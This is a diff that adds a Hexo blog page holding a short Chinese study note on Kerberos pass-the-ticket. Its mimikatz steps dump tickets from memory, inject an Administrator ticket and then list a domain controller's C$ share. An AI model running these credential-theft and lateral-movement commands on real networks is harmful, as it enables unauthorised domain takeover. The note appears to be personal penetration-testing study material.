@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>票据传递 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="票据传递 进入mimikatz，使用 privilege：：debug  导出票据   sekurlsa::tickets &#x2F;export  导出到server2012 的x64文件夹下、  清理掉内存里面的一些票据   kerberos::purge    把票据注入到内存中 kerberos::ptt c:\x64\ [0;8aacb]&amp;#x2d;&amp;#50;&amp;#x2d;&amp;#48;&amp;#45;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="票据传递">
+<meta property="og:url" content="http://example.com/2023/02/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="票据传递 进入mimikatz，使用 privilege：：debug  导出票据   sekurlsa::tickets &#x2F;export  导出到server2012 的x64文件夹下、  清理掉内存里面的一些票据   kerberos::purge    把票据注入到内存中 kerberos::ptt c:\x64\ [0;8aacb]&amp;#x2d;&amp;#50;&amp;#x2d;&amp;#48;&amp;#45;&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213223533876.png">
+<meta property="og:image" content="http://example.com/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213223841663.png">
+<meta property="og:image" content="http://example.com/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213224537707.png">
+<meta property="og:image" content="http://example.com/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230221211532019.png">
+<meta property="article:published_time" content="2023-02-21T14:38:48.000Z">
+<meta property="article:modified_time" content="2023-02-21T14:39:55.243Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213223533876.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-票据传递" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/02/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" class="article-date">
+  <time datetime="2023-02-21T14:38:48.000Z" itemprop="datePublished">2023-02-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      票据传递
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h4><ol>
+<li><p>进入mimikatz，使用 privilege：：debug<img src="/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213223533876.png" alt="image-20230213223533876"></p>
+</li>
+<li><p>导出票据   sekurlsa::tickets /export  导出到server2012 的x64文件夹下、</p>
+</li>
+<li><p>清理掉内存里面的一些票据   kerberos::purge  <img src="/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213223841663.png" alt="image-20230213223841663"></p>
+</li>
+<li><p>把票据注入到内存中 kerberos::ptt c:\x64\ [0;8aacb]<a href="mailto:&#x2d;&#50;&#x2d;&#48;&#45;&#x36;&#x30;&#x61;&#x31;&#48;&#x30;&#x30;&#48;&#45;&#65;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#x6b;&#x72;&#98;&#116;&#103;&#116;&#45;&#x4a;&#88;&#x47;&#x2e;&#x43;&#x4f;&#77;&#x2e;&#x6b;&#x69;&#x72;&#98;&#105;">&#x2d;&#50;&#x2d;&#48;&#45;&#x36;&#x30;&#x61;&#x31;&#48;&#x30;&#x30;&#48;&#45;&#65;&#x64;&#109;&#x69;&#110;&#105;&#115;&#116;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#x6b;&#x72;&#98;&#116;&#103;&#116;&#45;&#x4a;&#88;&#x47;&#x2e;&#x43;&#x4f;&#77;&#x2e;&#x6b;&#x69;&#x72;&#98;&#105;</a></p>
+<p><img src="/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230213224537707.png" alt="image-20230213224537707"></p>
+</li>
+<li><p>在本cmd中就可以 dir \ \dc-1\c$使用<img src="/img/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20230221211532019.png" alt="image-20230221211532019"></p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/21/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/" data-id="cleecyc6k0006nguz5bh1764r" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/02/21/ssh%E9%9A%A7%E9%81%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          ssh隧道
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/02/21/pass-the-hash/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">pass-the-hash</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/02/21/redis%E5%92%8C%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95/">redis和密钥登录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/frp%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93/">frp内网隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/dns%E9%9A%A7%E9%81%93/">dns隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/icmp%E9%9A%A7%E9%81%93/">icmp隧道</a>
+          </li>
+        
+          <li>
+            <a href="/2023/02/21/neo-regreg/">neo-regreg代理</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
